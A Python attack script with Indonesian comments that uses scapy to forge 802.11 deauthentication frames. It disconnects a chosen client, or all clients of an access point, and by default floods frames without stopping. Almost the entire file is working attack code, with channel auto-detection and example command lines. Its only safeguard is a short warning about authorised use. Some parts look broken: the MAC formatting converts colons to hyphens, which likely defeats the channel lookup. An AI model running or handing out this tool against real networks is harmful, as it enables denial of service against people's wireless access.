#!/usr/bin/env python3
"""
WiFi Deauthentication Attack Tool
[ROOT REQUIRED] Mengirimkan frame deauthentication IEEE 802.11 untuk
memutuskan koneksi client dari Access Point.

Penggunaan:
    python wifi_deauth.py --ap AA:BB:CC:DD:EE:FF --target 11:22:33:44:55:66 --iface wlan0mon
    python wifi_deauth.py --ap AA:BB:CC:DD:EE:FF --broadcast --iface wlan0mon --count 50
    python wifi_deauth.py --ap AA:BB:CC:DD:EE:FF --broadcast --iface wlan0mon --test

Peringatan: Hanya untuk pengujian keamanan yang sah. Penggunaan tanpa izin adalah ilegal.
"""

import argparse
import os
import signal
import sys
import time
from threading import Event

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    from scapy.layers.dot11 import Dot11Elt
except ImportError:
    sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")

STOP_EVENT = Event()


def check_root():
    if os.name == "posix" and os.geteuid() != 0:
        sys.exit("[!] Tool ini memerlukan akses root. Jalankan dengan sudo.")


def signal_handler(sig, frame):
    print("\n[!] Menerima sinyal interrupt. Menghentikan serangan...")
    STOP_EVENT.set()


def format_mac(mac: str) -> str:
    return mac.lower().replace(":", "-").replace(" ", "")


def build_deauth_frame(ap_mac: str, target_mac: str, reason: int = 7):
    return (
        RadioTap()
        / Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
        / Dot11Deauth(reason=reason)
    )


def run_attack(args):
    ap_mac = format_mac(args.ap)
    iface = args.iface
    count = args.count if not args.test else 1
    reason = args.reason
    interval = args.interval

    if args.channel:
        channel = args.channel
        print(f"[*] Mengatur channel ke {channel}...")
        _set_channel(iface, channel)
    else:
        print("[*] Channel tidak ditentukan, menggunakan channel saat ini.")

    targets = []
    if args.broadcast:
        targets.append("ff:ff:ff:ff:ff:ff")
        print(f"[+] Mode broadcast: memutuskan semua client dari AP {ap_mac}")
    else:
        target_mac = format_mac(args.target)
        targets.append(target_mac)
        print(f"[+] Target: {target_mac} | AP: {ap_mac}")

    if count > 0:
        print(f"[*] Mengirim {count} paket deauth dengan interval {interval}s")
    else:
        print("[*] Mengirim paket deauth secara terus-menerus (Ctrl+C untuk berhenti)")

    packet_count = 0
    try:
        for i in range(count if count > 0 else 999999999):
            if STOP_EVENT.is_set():
                break
            for target_mac in targets:
                pkt = build_deauth_frame(ap_mac, target_mac, reason)
                sendp(pkt, iface=iface, verbose=False)
                packet_count += 1
                print(f"  [*] Paket #{packet_count} -> {target_mac} (reason={reason})", end="\r")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    except PermissionError:
        sys.exit(
            "[!] Izin ditolak. Pastikan interface dalam monitor mode dan jalankan sebagai root."
        )
    except OSError as e:
        sys.exit(f"[!] Error interface: {e}")

    print(f"\n[+] Selesai. Total {packet_count} paket deauth dikirim.")


def _set_channel(iface: str, channel: int):
    if os.name == "posix":
        try:
            import subprocess

            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
                check=True,
            )
        except Exception:
            print(f"[!] Gagal mengatur channel {channel} pada {iface}")


def scan_channels(iface: str, ap_mac: str):
    import subprocess

    ap_mac = format_mac(ap_mac).lower()
    print(f"[*] Mencari channel untuk AP {ap_mac}...")
    try:
        if os.name == "posix":
            result = subprocess.run(
                ["iwlist", iface.replace("mon", "").rstrip("mon"), "scan"],
                capture_output=True,
                text=True,
                timeout=15,
            )
            for line in result.stdout.splitlines():
                line_lower = line.lower()
                if ap_mac in line_lower:
                    return _extract_channel(line_lower)
            for line in result.stdout.splitlines():
                if "channel" in line.lower():
                    print(f"    [*] {line.strip()}")
    except Exception:
        pass
    return None


def _extract_channel(line: str) -> int | None:
    import re

    m = re.search(r"channel\s*:?\s*(\d+)", line)
    if m:
        return int(m.group(1))
    m = re.search(r"frequency\s*:\s*([\d.]+)", line)
    if m:
        freq = float(m.group(1))
        if 2412 <= freq <= 2472:
            return int((freq - 2412) / 5) + 1
        elif 5180 <= freq <= 5825:
            return int((freq - 5180) / 5) + 36
    return None


def main():
    parser = argparse.ArgumentParser(
        description="WiFi Deauthentication Attack Tool [ROOT REQUIRED]",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  python wifi_deauth.py --ap 00:11:22:33:44:55 --target AA:BB:CC:DD:EE:FF --iface wlan0mon
  python wifi_deauth.py --ap 00:11:22:33:44:55 --broadcast --iface wlan0mon --count 100
  python wifi_deauth.py --ap 00:11:22:33:44:55 --broadcast --iface wlan0mon --test
        """,
    )
    parser.add_argument(
        "--ap", required=True, help="MAC address Access Point (contoh: AA:BB:CC:DD:EE:FF)"
    )
    parser.add_argument("--target", help="MAC address target client")
    parser.add_argument("--iface", required=True, help="Interface monitor mode (contoh: wlan0mon)")
    parser.add_argument(
        "--count", type=int, default=0, help="Jumlah paket deauth (0 = terus-menerus)"
    )
    parser.add_argument("--broadcast", action="store_true", help="Deauth semua client dari AP")
    parser.add_argument("--channel", type=int, default=0, help="Channel WiFi (0 = auto-detect)")
    parser.add_argument("--reason", type=int, default=7, help="Kode alasan deauth (default: 7)")
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="Interval antar paket dalam detik (default: 0.1)",
    )
    parser.add_argument("--test", action="store_true", help="Mode test: kirim 1 paket saja")
    args = parser.parse_args()

    if not args.broadcast and not args.target:
        sys.exit("[!] Gunakan --target atau --broadcast")
    if args.broadcast and args.target:
        sys.exit("[!] Gunakan salah satu: --target atau --broadcast, jangan keduanya")

    print("=" * 55)
    print("  WiFi Deauthentication Attack Tool")
    print("  [ROOT REQUIRED]")
    print("=" * 55)

    check_root()

    signal.signal(signal.SIGINT, signal_handler)

    if args.channel == 0 and not args.test:
        found_channel = scan_channels(args.iface, args.ap)
        if found_channel:
            print(f"[+] Channel AP terdeteksi: {found_channel}")
            args.channel = found_channel
        else:
            print("[!] Tidak dapat mendeteksi channel. Gunakan --channel secara manual.")

    if args.test:
        print("[*] MODE TEST: Hanya mengirim 1 paket")
        ap_mac = format_mac(args.ap)
        target_mac = "ff:ff:ff:ff:ff:ff" if args.broadcast else format_mac(args.target)
        if args.channel:
            _set_channel(args.iface, args.channel)
        pkt = build_deauth_frame(ap_mac, target_mac, args.reason)
        print(f"[+] Mengirim test deauth ke {target_mac}...")
        sendp(pkt, iface=args.iface, verbose=False)
        print("[+] Test selesai.")
        return

    print("[!] Peringatan: Hanya untuk pengujian keamanan yang sah dan terotorisasi!")
    time.sleep(1)
    run_attack(args)


if __name__ == "__main__":
    main()
